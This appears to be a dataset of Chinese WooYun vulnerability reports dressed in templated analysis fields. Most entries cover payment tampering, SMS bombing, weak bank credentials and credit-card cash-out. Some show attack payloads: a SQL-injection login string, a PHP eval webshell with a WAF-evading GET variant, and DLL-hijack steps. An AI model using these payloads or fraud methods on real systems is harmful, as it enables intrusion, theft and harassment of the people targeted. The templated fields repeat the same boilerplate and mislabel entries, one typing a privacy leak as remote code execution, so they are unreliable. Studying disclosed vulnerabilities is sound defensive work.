**详情**: 发送短信的数据：POST /cgi-bin/mmsupport-bin/getresetpwdurl HTTP/1.1Host: support.weixin.某域名.comConnection: keep-aliveContent-Length: 85Cache-Control: max-age=0Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.152 Safari/535.19 CoolNovo/[IP已脱敏]Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml

**POC**: 手机截图麻烦，不证明

**绕过**: 直接利用

**修复**: 记数时先验证一下号码
---

---
### [wooyun-2015-0153127] PHPOK企业建站系统(支付漏洞1元任意买);
**厂商**: phpok.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.来到产品展示随便选入一件商品进购物车下订单2.来到之类点确认支付抓包修改金额3.改成1元然会出现链接点开就好了只要1元就可以

**POC**: 1.来到产品展示随便选入一件商品进购物车下订单2.来到之类点确认支付抓包修改金额3.改成1元然会出现链接点开就好了只要1元就可以

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0160656] 中原银行某重要系统设计逻辑缺陷导致敏感信息泄漏
**厂商**: 中原银行 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中原银行邮件系统大量弱口令http://**.**.**.**/密码都为12345619	wanglei	302	false	false	50593	chenyong	302	false	false	505279	zhanglong	302	false	false	505285	wangrui	302	false	false	505330	liuting	302	false	false	505338	huangwei	302	false	false	505346	liujianhua	302	false	false	505370	wanghongmei	302	false	false	505394	liushuai	302	false	false	505445	wanglei	302	false	false	505463	zhangnan	302	false	false	505导出信息技术

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、增加验证码2、杜绝弱口令
---

---
### [wooyun-2012-011125] 某厂商开发者社区及论坛逻辑漏洞，可获得管理员权限
**厂商**: 某电脑厂商 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在某厂商开发者社区注册新用户时，竟然可以间接注册admin帐号，而注册的帐号又可以在开发者论坛“共用”，结果导致修改了开发者论坛的admin帐号信息（密码等），然后.....

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 做好服务端验证及访问控制，详情略
---

---
### [wooyun-2014-051330] 佳品网订单提交验证可导致发货困难
**厂商**: 佳品网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册用户，选择商品加入购物车burp一下可以看到提交的参数主要有3个，尺码，颜色，和数量。修改尺码或者数量，均有异常提醒。修改颜色就可以成功加入购物车看看，颜色不一样，这样子厂商无法发货啊。万一发原来的棕色，遇到刁钻的客户又要退货啊啥的，没准还要求赔偿呢。我下的是深绿色，为啥你们给我发棕色这样子的。送个短信轰炸，找回密码处，不仅针对佳品网绑定手机用户可以轰炸，通过操作可以针对任意手机号进行轰炸。针对注册的账号，手机号未验证，只要第一次验证给某个手机号发送个验证码就行了，实际上根本无需绑定。手机并未成功绑定，但是系统应该是默认你已经准备绑定此手机号了，所以找回密码处手机号有效burp一下进行轰炸

**POC**: 注册用户，选择商品加入购物车burp一下可以看到提交的参数主要有3个，尺码，颜色，和数量。修改尺码或者数量，均有异常提醒。修改颜色就可以成功加入购物车看看，颜色不一样，这样子厂商无法发货啊。万一发原来的棕色，遇到刁钻的客户又要退货啊啥的，没准还要求赔偿呢。我下的是深绿色，为啥你们给我发棕色这样子的。送个短信轰炸，找回密码处，不仅针对佳品网绑定手机用户可以轰炸，通过操作可以针对任意手机号进行轰炸。针对注册的账号，手机号未验证，只要第一次验证给某个手机号发送个验证码就行了，实际上根本无需绑定。手机并未成功绑定，但是系统应该是默认你已经准备绑定此手机号了，所以找回密码处手机号有效burp一下进行轰炸

**绕过**: 直接利用

**修复**: 其他参数都验证了，就为啥差这一个呢。/偷笑
---

---
### [wooyun-2014-084426] 某市城通卡密码验证逻辑漏洞导致后台信息泄露（有福利）
**厂商**: 唐山市城通卡运营服务有限公司 | **年份**: 2014 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统后台登陆危险字符未过滤。

**POC**: WooYun: 某城市卡通系统存在严重越权漏洞可能导致大量金融数据泄露看到路人甲神提交的漏洞后发现另一个连接也存在这个问题https://example.com/[已脱敏] admin'or'1'='1 密码：admin'or'1'='1。进入后台了。好多信息都可以修改，我神马都没做。对了，还有福利

**绕过**: 直接利用

**修复**: 过滤下
---

---
### [wooyun-2014-047610] APP安全#某运营商某客户端接口未限制导致短信轰炸
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: cservice.client.189.cn:8004/map/clientXML短信验证码登陆批量发送数据导致短信轰炸测试10次短信截图

**POC**: cservice.client.189.cn:8004/map/clientXML短信验证码登陆批量发送数据导致短信轰炸测试10次短信截图

**绕过**: 直接利用

**修复**: 频率限制
---

---
### [wooyun-2013-033757] IOS某游戏作弊一秒钟上GameCenter头一名（修改金钱、分数等）
**厂商**: 杭州小白工作室 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 是我无聊翻ifile翻到的   Library/Perferences/com.oneleaf.ninjamustdiecn.plist什么都写在这个文件里  什么金钱啊  最高记录啊   然后我改了个最高记录  看下game center呵呵呵  我也是世界冠军了~~~

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加个密把
---

---
### [wooyun-2015-090540] 某企业信息安全监控系统通用逻辑漏洞（可直接重置管理员密码）
**厂商**: ACT北京亚鸿世纪科技发展有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 企业侧互联网综合管理平台存在密码重置逻辑漏洞，可直接重置管理员密码http://xxxxxxxx/ucenter/login/loginAction!login.actionpostnewpwd=%21QAZ2wsx&newpwd1=%21QAZ2wsx&uid=system&question=&answer=china&step=4&act=forgetstep改为4 可直接重置密码

**POC**: 随便找一个证明http://[IP已脱敏] 这个是厂商主页。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-040563] 绕过安全狗iis防护
**厂商**: 安全狗 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <?php @eval($_POST['guige']);?>查杀用<?php @eval($_GET['guige']);?>把post修改成get成功绕过安全狗iis防护

**POC**: <?php @eval($_POST['guige']);?>查杀用<?php @eval($_GET['guige']);?>把post修改成get成功绕过安全狗iis防护

**绕过**: 过滤绕过

**修复**: 你懂的
---

---
### [wooyun-2015-0116387] 人人投某处设计缺陷可无限刷积分
**厂商**: 人人投 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在乌云看到一个洞：WooYun: 人人投某漏洞可刷无限瓶饮料过夏天应该不是一个吧，他说的是无限刷可乐，看到积分商城没有可乐而且积分商城东西都有数量不能无限刷~前面提交了几个支付漏洞厂商小等各种原因都没通过，申请个邀请码和大牛们学习就那么难？这个不能算是小厂商了吧？。。漏洞详情：先注册个账号登陆，然后到兑换积分的地方，兑换的时候抓包，发现根本抓不到包就直接跳出来了积分不够。。郁闷啊，看来应该是本地JS验证了想办法突破。。本地js的话不通过网络流量肯定有本地的数据，突然发现自己的当前积分不够，难道是因为这个？审查元素修改一下试试~修改好以后再抓包，成功抓到数据包，数量改成负的，ok成功~提交订单以后返回，积分上涨了~

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道。。求邀请码。。
---

---
### [wooyun-2010-0305] 360卫士主动防御绕过缺陷
**厂商**: 某安全厂商 | **年份**: 2010 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 360卫士自身在实现的时候，由于对dll加载的位置和合法性校验存在问题，导致恶意攻击者构造非法的dll即可绕过主动防御

**POC**: 拷贝360主动防御主程序（或者某安全厂商的其他程序）到某目录，在同目录放置WSOCK32.dll即可，WSOCK32.dll里的dllMail函数里可以执行恶意代码，整个行为将被360安全卫士放过，其他如NETAPI32.dll可能也同样有效

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2014-083402] [绕过修补]某旅游平台通过uid继续遍历用户邮箱账号
**厂商**: 某旅游平台旅行网 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个洞我主要是看https://example.com/[已脱敏]

**POC**: 地址：www.ctrip.com/member/confirm.asp?uid=admin&spec=890294

**绕过**: 直接利用

**修复**: 控制返回参数
---

---
### [wooyun-2014-052952] 某电商平台某活动可短信轰炸
**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 活动页面 https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ....
---

---
### [wooyun-2013-036607] 某搜索引擎影音最新版本多处DLL劫持
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: BaiduPlayer.exe运行时会加载多个不存在的DLL文件正常劫持正常运行安装目录bdplayerexchs.dll安装目录bdplayerexcht.dll安装目录bdplayerexchs.dll系统目录C:\windows\system32\dwmapi.dll正常劫持不正常运行安装目录bdlog.dll安装目录log_debug.dll安装目录serviceContainer.dll假如某搜索引擎影音安装在C盘劫持路径为：C:\Program Files\Baidu\BaiduPlayer\[IP已脱敏]\以其中劫持bdplayerexchs.dll为例，那么bdplayerexchs.dll这个DLL放在与BaiduPlayer.exe同目录下，可在BaiduPlayer.exe运行时同时加载。同时某搜索引擎影音运行前还会加载系统目录下不存在的DLL文件C:\windows\syst

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2013-038329] 58同城某处鸡肋设计缺陷的三种猥琐利用~
**厂商**: 58同城 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用之前一个小缺陷可实现以下3个方面的利用#~1可修改他人账号密码并成功登陆~#~2可获取58内部领导手机号~#~3对获取的58内部领导手机号进行短信轰炸~---------------------------------------------------------------------问题描述：验证码没有限制有效次数，可多次使用#~1可修改他人账号密码并成功登陆~登陆页面验证码无使用次数限制可暴力破解他人账号首先以用户admin密码123456正常登陆几次，因为前几次登陆是没有验证码的，所以等弹出验证码后再登陆，登陆时抓包POST /dounionlogin HTTP/1.1Host: passport.58.comProxy-Connection: keep-aliveContent-Length: 556Cache-Control: max-age=0Origin: http:

**POC**: 综上所述~

**绕过**: 过滤绕过

**修复**: 对验证码有效使用次数做限制~顺便求个58的小礼物吧~:D
---

---
### [wooyun-2014-053181] 再次挖掘某视频网站商城支付逻辑漏洞
**厂商**: 某视频网站网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞内容：	 1、下单后选择支付2.3.查看支付跳转链接如下:https://example.com/[已脱敏]

**POC**: 4.如图。

**绕过**: 直接利用

**修复**: 应该好好修复一下了.某视频网站是个上市企业，应该注重一点了吧。修复什么的你们比我懂！
---

---
### [wooyun-2011-01074] 金山毒霸对于带有自身版权的一切病毒都不处理！
**厂商**: 金山 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原因可能是由于金山毒霸的某种机制照成的！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对病毒进行无条件查杀！（不论版权）
---

---
### [wooyun-2013-018806] 某IM软件可以绕过某邮箱服务独立密码 收取/发送 邮件
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先要使用没有设置某邮箱服务独立密码的某互联网公司登录某互联网公司打开某邮箱服务提醒的插件。（若使用已经设置独立密码的某互联网公司登录，则需要独立密码开启此插件）然后在使用另外的设置了邮箱独立密码的某互联网公司登录时，不需要独立密码即可收取和发送邮件。（但不能查看所有邮件，只能查看自上次登录开始所接收到的邮件）

**POC**: 某互联网公司4.5（最新）版本设计不严，导致了这个逻辑缺陷。测试：这是设置了独立密码的某邮箱服务，我们给它发送邮件，是无法查看的。但使用某互联网公司的某邮箱服务插件时，可以看到：

**绕过**: 直接利用

**修复**: 这个我就不说了，加个判断就可以。
---

---
### [wooyun-2013-041742] IOS某电商平台绕过密码登录原手机所有使用过的某电商平台帐号
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台可能在手机端记录了用户的登陆信息， 由于设计缺陷可以用以下方法绕过密码登录手机上所有使用过的某电商平台帐号：1.删除某电商平台 2.重新安装某电商平台 3.再打开某电商平台就显本机登录过的某电商平台帐号，随便点一个不用密码就可以进入。漏洞在IOS上应该都存在(某电商平台帐号要在手机上做过交易操作，纯登录可能无法重现)，暂没测试安卓设备。

**POC**: 原来某电商平台登录介面是这样的，必须输密码现删除某电商平台再重新安装再打开某电商平台就发现问题了，会显示原来登录过的某电商平台帐号，并不需要密码就可以点进去这个手势密码不是原来的,重新设置就可以绕过密码进入了

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0107132] 某电商平台Android客户端逻辑缺陷导致隐私泄漏
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台Android版对file域下符号链接限制不当，可导致cookie等用户隐私被窃取

**POC**: 接收参数：private void b() {Intent v0 = this.getIntent();this.g = v0.getStringExtra("activityName");this.a = v0.getStringExtra("background");this.c = v0.getStringExtra("param");this.h = v0.getBooleanExtra("isShowTitle", true);this.i = v0.getBooleanExtra("isPost", false);this.j = v0.getBooleanExtra("isNee

**绕过**: 直接利用

**修复**: 不要将不必要组件导出；如需导出，禁止使用File协议；如需使用File协议，禁止js执行：setJavaScriptEnabled（False）
---

---
### [wooyun-2013-035456] pps影音DLL劫持漏洞（不限路径）
**厂商**: PPS网络电视 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: pps影音PPstream（版本3,1,0,1107），安装程序为官网ppstreamsetup.exe（2013.[IP已脱敏].57），windows xp sp3环境，ppstream运行时会试图加载一个不带路径的tsr.dll文件，如果在音视频文件目录下放置一个恶意的tsr.dll文件，当用户双击打开该音视频文件时，恶意DLL即被加载触发，危害性不用说了吧。备注：ppskernel.exe也同样存在该问题，会加载tsr.dll文件。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 带全路径加载。
---

---
### [wooyun-2012-05036] 广东高考口语存在漏洞，考生可更改录音
**厂商**: 启明科技 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 考生录音放在C盘的COTSave文件夹中，假如考生在答案上传前通过学校共享或其他途径，可把别人答案覆盖自己的进行作弊。还有COTTemp文件里面试题泄漏，假如我在第一题和最后的那些复述题用任务管理器，新建任务，打开录音，跟着录音读一次…我满分了…我测试版本是8.2，高考用8.5，但是还是请厂商看看是否存在上述漏洞

**POC**: 同上，厂商请自查

**绕过**: 直接利用

**修复**: 加密存放的录音和试题文件
---

---
### [wooyun-2016-0169878] 久泰能源协同办公系统设计逻辑缺陷
**厂商**: 久泰能源 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址**.**.**.**:8089/弱口令用户：（密码都是123456）wangyanwanghaomachao另外还几个，黏贴太累进入后，还要邮箱系统入口，电子采购系统入口

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0121235] 橡果国际支付漏洞
**厂商**: xiangguo.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购物车可以修改物品数量为负数（抓包修改）去支付后跳转至某电商平台页面邮费付不起，不然就买了。然后也不会算怎么拼凑出最小值，就不付了

**POC**: 购物车可以修改物品数量为负数（抓包修改）去支付后跳转至某电商平台页面邮费付不起，不然就买了。然后也不会算怎么拼凑出最小值，就不付了

**绕过**: 直接利用

**修复**: 你们懂
---

---
### [wooyun-2015-0130598] 票票通支付漏洞任意金额购票(嘛嘛再也不用担心我没钱看明星演唱会了)
**厂商**: 票票通 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先看一下官网。。。啥票都可以买，电影票,飞机票,火车票,演出门票还是先选个门票，我选的张靓颖的演唱会门票780元，然后购买，填写购票人资料和地址，选择在线支付，再提交抓包。。。我把780改为了1

**POC**: 然后返回下单成功。。。到某电商平台付款付款金额为1元我没有付款，只做测试

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036770] 某银行手机客服端可查本省任意手机号机主姓名
**厂商**: 某银行 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进入某银行手机客服端的主菜单，点击账单缴付-自助缴付，选择自己的网银账号后，只要输入手机号码的归属地，选择通讯费，选择号码的运营商（前提该号码运营商在该市跟某银行有合作关系），输入手机号码后就会显示客户的姓名以及话费余额每个市可以验证的号码有不同，随州的移动和电信都可以，武汉市只有移动

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-023263] 某电商平台上信用卡提现的实现
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台上向他人转账时，规则是不可以使用信用卡来付的但是有个找他人代付的功能而被要求代付的人的支付页面却是可以用信用卡支付的业务逻辑上表现出的结果是，代付行为等同于购买行为但实质上却实现了转账的功能而且被转帐方的钱可以提现到储蓄卡中，从而间接实现了信用卡套现我不知道是不是这个规则是允许的，我个人觉得不妥

**POC**: 我用我的三个帐号实现了把信用卡里的钱提现到了银行卡中a帐号给b帐号付款，请求c帐号代付，c帐号用信用卡支付成功，b帐号提现到储蓄卡成功补充点细节，不知道对结果是不是有影响的。有一个帐号我使用的是代理登录的，而且b和c帐号绑定的是同一个实名

**绕过**: 直接利用

**修复**: 如果代付类型是转账，应该也不允许用信用卡支付如果日后清算，请饶过我的100元的测试交易行为
---

---
### [wooyun-2015-0136984] 某市火车站wifi系统可任意号码登录
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 郑州市火车站候车厅提供了wifi服务但要用手机号下发验证码的方式进行认证我们来看看：发送到手机的验证码为4位纯数字，那么经点测试号码13888888888上线~发送验证码，进行爆破找到了某个返回值特殊显示网络已开通，难道这就完了？不不不，发现还可以利用来进行短信轰炸细心点会发现在提交手机号下发验证码时会有发送验证码时间间隔限制，但仅校验mac地址，而mac地址就在提交的参数中~只需要遍历生成MAC地址，就可以对特定号码进行轰炸13888888888的用户不要怪我。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: wifi认证的验证码还是变变花样吧，同时，申请验证码的时候做好校验，最好针对同一号码进行时间限制而不只是MAC地址的限制，PS:郑州烩面蛮好吃哒~
---

---
### [wooyun-2012-06567] 搜房验证短信随意发，你手多快它就能发多快
**厂商**: 搜房网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加验证码
---

---
### [wooyun-2011-02550] 某互联网公司音乐bug
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0107087] 某P2P行业语音验证码(电话轰炸)和短信验证码(短信轰炸)漏洞
**厂商**: 乾多多 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Google搜索关键字"语音验证码"，找到钱多多的注册链接：填写完验证码和手机号后点击"获取语音验证码"，不一会手机会接到一个400的语音短信播报电话，同时也会收到一条短信验证码，挺有钱的哈，手机语音电话和短信验证码同时发，有点浪费资源。60秒倒计时，请出burp，抓包：然后交给Repeater：心情不好了点两下，点一次来两个（电话、短信），要是心情再不好咋办呢，交给Intruder，加个递增参数，设个线程，想想都觉得好玩，打住打住，俺不是那种人。

**POC**: Google搜索关键字"语音验证码"，找到钱多多的注册链接：填写完验证码和手机号后点击"获取语音验证码"，不一会手机会接到一个400的语音短信播报电话，同时也会收到一条短信验证码，挺有钱的哈，手机语音电话和短信验证码同时发，有点浪费资源。60秒倒计时，请出burp，抓包：然后交给Repeater：心情不好了点两下，点一次来两个（电话、短信），要是心情再不好咋办呢，交给Intruder，加个递增参数，设个线程，想想都觉得好玩，打住打住，俺不是那种人。

**绕过**: 直接利用

**修复**: 问题：1.验证码限制没做好，怎么着也得获取一次语音（短信）验证码更换一次上面的图形验证码吧；2.只是做了客户端验证码发送次数校验，但是没有做服务器端的，导致可以无限刷；3.短信验证码和语音验证码并行使用是好事，不过不用同时给用户发送短信验证码和语音验证码吧，怪浪费的，用户体验也不好，用户是眼有问题呢
---

---
### [wooyun-2015-0154570] 安卓论坛某处设计逻辑缺陷可撞库（成功帐号证明）
**厂商**: 福建网龙 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们先去注册一个账号 等会用来测试 账号密码如下注册成功现在我们重新登录 然后抓包

**POC**: 看下我们抓的包POST https://example.com/[已脱敏] HTTP/1.1Host: bbs.hiapk.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: 

**绕过**: 直接利用

**修复**: 添加复杂点验证码 我只想到这个…… 要不来个虹膜识别啥的也行
---

---
### [wooyun-2012-07015] 某搜索引擎应用，MD5在线解密，解密结果为32位加密密文
**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 7a57a5a743894a0e的解密结果为d97ccfe64a25155f369f9b5ca0db9c49没cmd网站的会员不知道d97ccfe64a25155f369f9b5ca0db9c49是什么，试了几个密文解密出来都是32位的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2012-012824] Android手机远程擦除漏洞
**厂商**: android | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 要检测你的手机是否也存在这个问题，如果你的手机存在这一远程擦除漏洞，访问这个地址https://example.com/[已脱敏] IMEI 号。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 装一个第三方拨号器程序，因为大部分第三方拨号器程序并没有权限或功能可以直接处理这种特殊字符串。而问题的最终解决当然还是要等待各自手机厂商的系统更新
---

---
### [wooyun-2014-052144] RenderBus通过某电商平台充值存在用户输入校验问题和汇率逻辑漏洞
**厂商**: Renderbus | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

